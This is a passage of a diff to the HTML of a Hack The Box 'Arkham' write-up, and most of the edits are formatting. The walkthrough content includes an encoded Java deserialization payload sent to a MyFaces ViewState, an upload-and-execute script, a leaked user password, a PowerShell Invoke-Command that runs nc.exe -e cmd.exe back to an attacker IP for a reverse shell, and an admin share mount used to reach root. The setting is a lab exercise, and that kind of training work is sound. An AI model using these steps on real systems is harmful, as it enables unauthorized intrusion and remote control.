uH%2BsV3gx3v3PoFcpnc1%2BAJTHWKqHfCy1opEh7cDv2tdwg%2FTiZmJ7Y2965FPpV2Dw1mICArOvAOCf9fzZiZncI%2BCoX%2FOuaRilAYhWNKe8XzdQP6NjTNMEAoU8qpv%2FvNvILq22We0wQ1mUW3OrpauOZzU7%2BmQoL%2BGnNtOpmFx%2FzHz9CO1Qw3PfdQHYhQvw4tg%2FW90wu3EVMxVnQ5zD2tQV6GrCAJFCMnfi8x%2Bf6%2BnW9kb%2F3KJjeLP9EaVtnw4HgbxOvCM237bf506YkZewPgxQiLewUhIRMklMJnDnzAWGDt7FI7YRaUwB8JGXyetfsWfwktvElTU8G%2Fq7MLUp4%2BGPRDBvo6SMhFsfpnWDv02QaeNaSLMlE9boIJFbYlwyeLs9OWTCIP4cwrVmtcdeHaJalFuas%2BcLlmoyCpiYNGomoF2fGsKSBlO02H5aD7eIK4KEmO7jZE%2FsAoHMWWJfxo23t44S4ahSOeHfvlzJqhV2WT62diMizXDhDlWLlH5eRWvOufroUtk3jPS%2B%2F%2B6Ud4Bajai2yaRfDxHbTJgZ6IWsFXJmYIJXEh5ODaSShdwisWrLMFqobrL%2B3iOMkCTIPHpwTC4k4WjyVGoC3EmsS4trV68wenfb4asCPSZABGwnwfoqx6CHK%2BPGB13aRjo4KzHOVh7W5RxqOnjWWACJFXGhBny4XW4CootugK59aLaXuOyv6AM6KeF8cfH0GU8FiZ%2BF0wy6hHdRzv29OOgXpgJZaMjXVY9Qh34X7raWi1V1bOk3wI5mPW2oCG%2FHiPH0hgDaLJD%2F5rWumATBRhPfQdMukPUuvh7aBrYKhTjoF6YCWWjI11WPUId%2BF%2B62lotVdWzpNlg7XO%2BO71UXIulcb15uC4Uo%2FmVX%2BF55hhstnKpruvCRn1%2FE2U%2BSHSUwJwYQalMFkB3EYe3Bg0twUHB0FLdRlgk%2B1LfoOx%2BOAGABHbKLruPQnSgSaOr0QO7fs3ABDYpM%2B0brsRYoVq%2FxZrXHXh2iWpRbmrPnC5ZqMgqYmDRqJqBegTWtulqHIbfmX3cwmZtK73nCNfCh4bR8nU8ph%2B9dFQFQm3TB92LYOU%2Bo9ImRGT5ZxHsqO7r9vsYEY9lEOrVQEonBeV1772fxzAWY30P6lQjx7QKzqFpGw7VVu9x6xj4HqyzMw3srhBWpB1evb%2F2cj2VJfV2Ik%2Fe1XeDhxd98FCKdtuwD%2FhfhKKwyMHBLd%2B%2BTRSti5%2BPjgedH8VrYCDw%2Bh7TXbFuuzmic0Ejp%2FMdRQ2lgM7A1Zk2tN7LvOGYXm5vai2%2Fp9KNzcb82%2BWwUxFUNdG%2Fr%2B91Skv9JVChFgo1kBKZ5DSG9GVW0c93lwaDPZR8m2MdKuCGEIGysMjBwS3fvkWX6kL5w8G98g8evxDbfYkHzyF14jnr2kMvA1HZRyD2wcvsnF03HnathuuAfsXFi9nSS%2FwbSz1fz4k0TLI7Jwpbv6aAGFYU9IId4BaMaICpD4zmUdsKF%2FchdWUs7E65By387U2Ejeqn%2FY3UAanW9XVGnW1aWk9nG1iLSIviO15BJYS2423DKh2itxBdEkoL7a2k0YgPMLX%2BRvyB%2F2m0z59yPgQijAFFrHv%2FFHK9kS3bd5CXSj%2BQrhHen7wNrMeCa7i0HvzRcKdoRRaP1oZYT1VagG4ZxblvAnvEIlw06ZZ5I0FbIXQZD0hxEVL%2FVgEmicZbJY6G4sqBwTtsZahAdOH9EIpPlR1Lk2x5bUT15gaZNEWJ%2BgSEfhKSsMjBwS3fvkuOvKtC8ttV3HZjlugWuZSt5XvisFw2swkCBSZsRlmf8rDIwcEt375HX%2FLlXyNL0Oc117xPruVt3hwVMXWIvRWU%2B1LfoOx%2BOAo66bHdBWC0UFv1HE5WCU3IPKGs6NPijKqJWULKKxdYHba3wuN9N4KGU6y1DQGkboG9trDs8z3Vv17f0whCQpR392T%2FgkPJdE2M0q797EOI1suR5UQIOUxEyYZ50%3D
 </code></pre></div></div>
 <p><br> Response :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 500 
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">HTTP/1.1 500 
 Content-Type: text/html;charset=utf-8
 Content-Language: en
 Content-Length: 2570
 Date: Fri, 09 Aug 2019 18:38:50 GMT
 Connection: close
 
-<span class="cp">&lt;!doctype html&gt;</span><span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;&lt;head&gt;&lt;title&gt;</span>HTTP Status 500 â Internal Server Error<span class="nt">&lt;/title&gt;&lt;style </span><span class="na">type=</span><span class="s">"text/css"</span><span class="nt">&gt;h1</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;</span><span class="nl">font-size</span><span class="p">:</span><span class="m">22px</span><span class="p">;}</span> <span class="nt">h2</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;</span><span class="nl">font-size</span><span class="p">:</span><span class="m">16px</span><span class="p">;}</span> <span class="nt">h3</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;</span><span class="nl">font-size</span><span class="p">:</span><span class="m">14px</span><span class="p">;}</span> <span class="nt">body</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">black</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="no">white</span><span class="p">;}</span> <span class="nt">b</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;}</span> <span class="nt">p</span> <span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="nb">sans-serif</span><span class="p">;</span><span class="nl">background</span><span class="p">:</span><span class="no">white</span><span class="p">;</span><span class="nl">color</span><span class="p">:</span><span class="no">black</span><span class="p">;</span><span class="nl">font-size</span><span class="p">:</span><span class="m">12px</span><span class="p">;}</span> <span class="nt">a</span> <span class="p">{</span><span class="nl">color</span><span class="p">:</span><span class="no">black</span><span class="p">;}</span> <span class="nt">a</span><span class="nc">.name</span> <span class="p">{</span><span class="nl">color</span><span class="p">:</span><span class="no">black</span><span class="p">;}</span> <span class="nc">.line</span> <span class="p">{</span><span class="nl">height</span><span class="p">:</span><span class="m">1px</span><span class="p">;</span><span class="nl">background-color</span><span class="p">:</span><span class="m">#525D76</span><span class="p">;</span><span class="nl">border</span><span class="p">:</span><span class="nb">none</span><span class="p">;}</span><span class="nt">&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;</span>HTTP Status 500 â Internal Server Error<span class="nt">&lt;/h1&gt;&lt;hr</span> <span class="na">class=</span><span class="s">"line"</span> <span class="nt">/&gt;&lt;p&gt;&lt;b&gt;</span>Type<span class="nt">&lt;/b&gt;</span> Exception Report<span class="nt">&lt;/p&gt;&lt;p&gt;&lt;b&gt;</span>Message<span class="nt">&lt;/b&gt;</span> class javax.management.BadAttributeValueExpException cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException is in module java.management of loader <span class="ni">&amp;#39;</span>bootstrap<span class="ni">&amp;#39;</span>; [Ljava.lang.Object; is in module java.base of loader <span class="ni">&amp;#39;</span>bootstrap<span class="ni">&amp;#39;</span>)<span class="nt">&lt;/p&gt;&lt;p&gt;&lt;b&gt;</span>Description<span class="nt">&lt;/b&gt;</span> The server encountered an unexpected condition that prevented it from fulfilling the request.<span class="nt">&lt;/p&gt;&lt;p&gt;&lt;b&gt;</span>Exception<span class="nt">&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;</span>java.lang.ClassCastException: class javax.management.BadAttributeValueExpException cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException is in module java.management of loader <span class="ni">&amp;#39;</span>bootstrap<span class="ni">&amp;#39;</span>; [Ljava.lang.Object; is in module java.base of loader <span class="ni">&amp;#39;</span>bootstrap<span class="ni">&amp;#39;</span>)
+&lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 500 â Internal Server Error&lt;/title&gt;&lt;style type="text/css"&gt;h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 500 â Internal Server Error&lt;/h1&gt;&lt;hr class="line" /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Exception Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; class javax.management.BadAttributeValueExpException cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException is in module java.management of loader &amp;#39;bootstrap&amp;#39;; [Ljava.lang.Object; is in module java.base of loader &amp;#39;bootstrap&amp;#39;)&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server encountered an unexpected condition that prevented it from fulfilling the request.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Exception&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;java.lang.ClassCastException: class javax.management.BadAttributeValueExpException cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException is in module java.management of loader &amp;#39;bootstrap&amp;#39;; [Ljava.lang.Object; is in module java.base of loader &amp;#39;bootstrap&amp;#39;)
         org.apache.myfaces.renderkit.html.HtmlResponseStateManager.getSavedState(HtmlResponseStateManager.java:187)
         org.apache.myfaces.renderkit.html.HtmlResponseStateManager.getState(HtmlResponseStateManager.java:139)
         org.apache.myfaces.application.jsp.JspStateManagerImpl.restoreView(JspStateManagerImpl.java:355)
@@ -460,13 +456,13 @@ Connection: close
         org.apache.myfaces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:76)
         javax.faces.webapp.FacesServlet.service(FacesServlet.java:244)
         org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
-<span class="nt">&lt;/pre&gt;&lt;p&gt;&lt;b&gt;</span>Note<span class="nt">&lt;/b&gt;</span> The full stack trace of the root cause is available in the server logs.<span class="nt">&lt;/p&gt;&lt;hr</span> <span class="na">class=</span><span class="s">"line"</span> <span class="nt">/&gt;&lt;h3&gt;</span>Apache Tomcat/8.5.37<span class="nt">&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;</span>
-</code></pre></div></div>
+&lt;/pre&gt;&lt;p&gt;&lt;b&gt;Note&lt;/b&gt; The full stack trace of the root cause is available in the server logs.&lt;/p&gt;&lt;hr class="line" /&gt;&lt;h3&gt;Apache Tomcat/8.5.37&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;
+</span></code></pre></div></div>
 <p><br> Then I checked my listener, and :
-<img src="/images/hackthebox/arkham/11.png" alt="">
+<br><img src="/images/hackthebox/arkham/11.png" alt=""><br>
 <br> We owned user !
 <br> I also scripted this because copying and pasting in burp wasn’t my favorite thing and it only takes 2 minutes to script this in python :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python3</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python3</span>
 <span class="kn">import</span> <span class="nn">requests</span>
 
 <span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
@@ -479,7 +475,7 @@ Connection: close
 <span class="n">exploit</span><span class="p">(</span><span class="n">upload_payload</span><span class="p">)</span>
 <span class="n">exploit</span><span class="p">(</span><span class="n">execute_payload</span><span class="p">)</span>
 </code></pre></div></div>
-<p><img src="/images/hackthebox/arkham/12.png" alt=""></p>
+<p><br><img src="/images/hackthebox/arkham/12.png" alt=""><br></p>
 <hr>
 
 <h2 id="shell-as-batman">Shell as Batman</h2>
@@ -772,7 +768,7 @@ image001.png: PNG image data, 677 x 343, 8-bit/color RGB, non-interlaced
 root@kali:~/Desktop/HTB/boxes/arkham/backups# 
 </code></pre></div></div>
 <p><br> <code class="highlighter-rouge">image001.png</code> :
-<img src="/images/hackthebox/arkham/13.png" alt="">
+<br><img src="/images/hackthebox/arkham/13.png" alt=""><br>
 <br> Great, we have the password for <code class="highlighter-rouge">Batman</code>. By checking the local group memberships of <code class="highlighter-rouge">Batman</code> we can see that <code class="highlighter-rouge">Batman</code> is in the Administrators group, and also in the Remote management users group :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\&gt;net user batman
 net user batman
@@ -807,23 +803,23 @@ The command completed successfully.
 C:\&gt;
 </code></pre></div></div>
 <p><br> So we can use <code class="highlighter-rouge">powershell</code>’s <code class="highlighter-rouge">Invoke-Command</code> with the credentials we have to get a reverse shell  :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\&gt;powershell
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\&gt;powershell
 powershell
 Windows PowerShell
-Copyright (C) Microsoft Corporation. All rights reserved.
+Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.
 
-PS C:\&gt; $username = 'batman'
-$username = 'batman'
-PS C:\&gt; $password = 'Zx^#QZX+T!123'
-$password = 'Zx^#QZX+T!123'
-PS C:\&gt; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
-$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
-PS C:\&gt; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
-$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
-PS C:\&gt; Invoke-command -computername ARKHAM -credential $credential -scriptblock { cmd.exe /c "C:\windows\system32\spool\drivers\color\nc.exe" -e cmd.exe 10.10.xx.xx 1338 }                                      
-Invoke-command -computername ARKHAM -credential $credential -scriptblock { cmd.exe /c "C:\windows\system32\spool\drivers\color\nc.exe" -e cmd.exe 10.10.xx.xx 1338 }
+<span class="nb">PS </span>C:\&gt; <span class="nv">$username</span> <span class="o">=</span> <span class="s1">'batman'</span>
+<span class="nv">$username</span> <span class="o">=</span> <span class="s1">'batman'</span>
+<span class="nb">PS </span>C:\&gt; <span class="nv">$password</span> <span class="o">=</span> <span class="s1">'Zx^#QZX+T!123'</span>
+<span class="nv">$password</span> <span class="o">=</span> <span class="s1">'Zx^#QZX+T!123'</span>
+<span class="nb">PS </span>C:\&gt; <span class="nv">$securePassword</span> <span class="o">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="nv">$password</span> -AsPlainText -Force
+<span class="nv">$securePassword</span> <span class="o">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="nv">$password</span> -AsPlainText -Force
+<span class="nb">PS </span>C:\&gt; <span class="nv">$credential</span> <span class="o">=</span> <span class="nb">New-Object </span>System.Management.Automation.PSCredential <span class="nv">$username</span>, <span class="nv">$securePassword</span>
+<span class="nv">$credential</span> <span class="o">=</span> <span class="nb">New-Object </span>System.Management.Automation.PSCredential <span class="nv">$username</span>, <span class="nv">$securePassword</span>
+<span class="nb">PS </span>C:\&gt; Invoke-command -computername ARKHAM -credential <span class="nv">$credential</span> -scriptblock <span class="o">{</span> cmd.exe /c <span class="s2">"C:\windows\system32\spool\drivers\color\nc.exe"</span> -e cmd.exe 10.10.xx.xx 1338 <span class="o">}</span>                                      
+Invoke-command -computername ARKHAM -credential <span class="nv">$credential</span> -scriptblock <span class="o">{</span> cmd.exe /c <span class="s2">"C:\windows\system32\spool\drivers\color\nc.exe"</span> -e cmd.exe 10.10.xx.xx 1338 <span class="o">}</span>
 </code></pre></div></div>
-<p><img src="/images/hackthebox/arkham/14.png" alt="">
+<p><br><img src="/images/hackthebox/arkham/14.png" alt=""><br>
 <br></p>
 <hr>
 
@@ -845,7 +841,7 @@ net use Z: \\ARKHAM\C$
 The command completed successfully.
 </code></pre></div></div>
 <p><br> And yes that worked :
-<img src="/images/hackthebox/arkham/15.png" alt="">
+<br><img src="/images/hackthebox/arkham/15.png" alt=""><br>
 <br> We owned root !
 <br> That’s it , Feedback is appreciated !
 <br> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
